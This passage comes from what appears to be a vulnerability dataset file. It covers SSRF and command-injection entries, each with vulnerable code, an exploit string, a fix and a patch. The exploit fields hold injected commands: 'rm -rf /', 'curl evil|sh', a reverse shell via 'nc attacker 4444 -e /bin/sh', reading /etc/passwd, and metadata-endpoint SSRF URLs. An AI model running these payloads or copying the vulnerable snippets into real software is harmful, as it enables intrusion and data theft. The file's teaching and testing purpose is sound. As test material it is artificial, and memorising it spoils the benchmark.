        fix="Allowlist hosts and block internal/link-local ranges; prefer direct file upload.",
        patch="+    if not is_public_host(request.POST['csv_url']):\n+        return HttpResponseBadRequest()\n     data = requests.get(request.POST['csv_url']).content",
        severity="HIGH",
    ),
    vuln(
        id="b006-ssrf-img-resize-proxy",
        lang="javascript", framework="next", file="route.ts", line=2,
        code=(
            "export async function GET(req) {\n"
            "  const src = new URL(req.url).searchParams.get('src');\n"
            "  const r = await fetch(src);  // image proxy, no allowlist\n"
            "  return new Response(await r.arrayBuffer(), { headers: { 'content-type': 'image/png' } });\n"
            "}\n"
        ),
        category="SSRF",
        description="Image resize/proxy route fetches any src URL server-side.",
        exploit="src=http://169.254.169.254/... or internal hostnames are fetched and returned.",
        fix="Allowlist image hosts; reject private/link-local addresses.",
        patch="+  if (!isAllowedImageHost(src)) return new Response('bad src', { status: 400 });\n   const r = await fetch(src);",
        severity="HIGH",
    ),
    vuln(
        id="b006-ssrf-redirect-follow",
        lang="python", framework="flask", file="fetch.py", line=2,
        code=(
            "def fetch(url):\n"
            "    if is_public_host(url):  # checks the FIRST url only\n"
            "        return requests.get(url, allow_redirects=True).text  # follows redirect to internal\n"
        ),
        category="SSRF",
        description="Host allowlist is checked only on the initial URL, then redirects are followed blindly.",
        exploit="A public URL 302-redirects to http://169.254.169.254/, which the client then fetches.",
        fix="Disable automatic redirects and re-validate each hop's host.",
        patch="-        return requests.get(url, allow_redirects=True).text\n+        r = requests.get(url, allow_redirects=False)\n+        if r.is_redirect and not is_public_host(r.headers['Location']):\n+            abort(400)\n+        return r.text",
        severity="HIGH",
    ),

    # ===================== COMMAND_INJECTION (7) ==========================
    vuln(
        id="b006-cmdi-ffmpeg",
        lang="python", framework="flask", file="transcode.py", line=2,
        code=(
            "def transcode(name):\n"
            "    os.system(f'ffmpeg -i uploads/{name} out.mp4')  # name from upload\n"
        ),
        category="COMMAND_INJECTION",
        description="Filename interpolated into an os.system ffmpeg call.",
        exploit="name='x.mp4; rm -rf /' injects a destructive second command.",
        fix="Pass arguments as a list to subprocess without a shell.",
        patch="-    os.system(f'ffmpeg -i uploads/{name} out.mp4')\n+    subprocess.run(['ffmpeg', '-i', f'uploads/{name}', 'out.mp4'], check=True)",
    ),
    vuln(
        id="b006-cmdi-git-clone",
        lang="javascript", framework="node", file="clone.js", line=1,
        code=(
            "exec(`git clone ${req.body.repoUrl} /tmp/work`);  // repoUrl from request\n"
        ),
        category="COMMAND_INJECTION",
        description="User-supplied repo URL interpolated into a shell git clone.",
        exploit="repoUrl='x; curl evil|sh' runs arbitrary commands on the server.",
        fix="Use execFile with an argv array and validate the URL.",
        patch="-exec(`git clone ${req.body.repoUrl} /tmp/work`);\n+execFile('git', ['clone', '--', req.body.repoUrl, '/tmp/work']);",
    ),
    vuln(
        id="b006-cmdi-node-template",
        lang="javascript", framework="express", file="thumb.js", line=1,
        code=(
            "require('child_process').exec(`convert ${file} -resize 100x100 ${file}.thumb`);\n"
        ),
        category="COMMAND_INJECTION",
        description="Shell command built with template interpolation of a filename.",
        exploit="file='a.png; nc attacker 4444 -e /bin/sh' opens a reverse shell.",
        fix="Use execFile with separate arguments.",
        patch="-require('child_process').exec(`convert ${file} -resize 100x100 ${file}.thumb`);\n+require('child_process').execFile('convert', [file, '-resize', '100x100', `${file}.thumb`]);",
    ),
    vuln(
        id="b006-cmdi-php-shellexec",
        lang="php", framework="none", file="ping.php", line=1,
        code=(
            "echo shell_exec('ping -c1 ' . $_GET['host']);\n"
        ),
        category="COMMAND_INJECTION",
        description="Request parameter passed to shell_exec without sanitization.",
        exploit="host='8.8.8.8; cat /etc/passwd' leaks files; backticks run arbitrary commands.",
        fix="Validate input strictly and use escapeshellarg, or avoid the shell entirely.",
        patch="-echo shell_exec('ping -c1 ' . $_GET['host']);\n+$host = $_GET['host'];\n+if (!filter_var($host, FILTER_VALIDATE_IP)) { http_response_code(400); exit; }\n+echo shell_exec('ping -c1 ' . escapeshellarg($host));",
    ),
    vuln(
        id="b006-cmdi-ruby-open-pipe",
        lang="ruby", framework="rails", file="report.rb", line=1,
        code=(
            "IO.popen(\"wkhtmltopdf #{params[:url]} out.pdf\")\n"
        ),
        category="COMMAND_INJECTION",
        description="User URL interpolated into a piped shell command.",
        exploit="url='http://x; rm -rf /' executes a second command in the shell.",
        fix="Pass an argv array so no shell is invoked.",
        patch="-IO.popen(\"wkhtmltopdf #{params[:url]} out.pdf\")\n+IO.popen(['wkhtmltopdf', params[:url], 'out.pdf'])",
    ),
    vuln(
        id="b006-cmdi-python-shelltrue-join",
        lang="python", framework="fastapi", file="zip.py", line=2,
        code=(
            "def archive(paths):\n"
            "    subprocess.run('zip out.zip ' + ' '.join(paths), shell=True)  # paths from request\n"
        ),
        category="COMMAND_INJECTION",
        description="User-supplied paths joined into a shell=True command.",
        exploit="A path of '; curl evil|sh' is parsed by the shell and executed.",
        fix="Pass the argument list directly without shell=True.",
        patch="-    subprocess.run('zip out.zip ' + ' '.join(paths), shell=True)\n+    subprocess.run(['zip', 'out.zip', *paths], check=True)",
    ),
    vuln(
        id="b006-cmdi-go-exec-sh",
        lang="go", framework="net/http", file="run.go", line=2,
        code=(
            "cmd := exec.Command(\"sh\", \"-c\", \"lookup \"+r.URL.Query().Get(\"q\"))\n"
            "out, _ := cmd.Output()\n"
        ),
        category="COMMAND_INJECTION",
        description="Query parameter concatenated into `sh -c`, invoking the shell on user input.",
        exploit="q='; cat /etc/passwd' runs arbitrary commands via the shell.",
        fix="Invoke the binary directly with arguments; do not use sh -c.",
        patch="-cmd := exec.Command(\"sh\", \"-c\", \"lookup \"+r.URL.Query().Get(\"q\"))\n+cmd := exec.Command(\"lookup\", r.URL.Query().Get(\"q\"))",
    ),
]
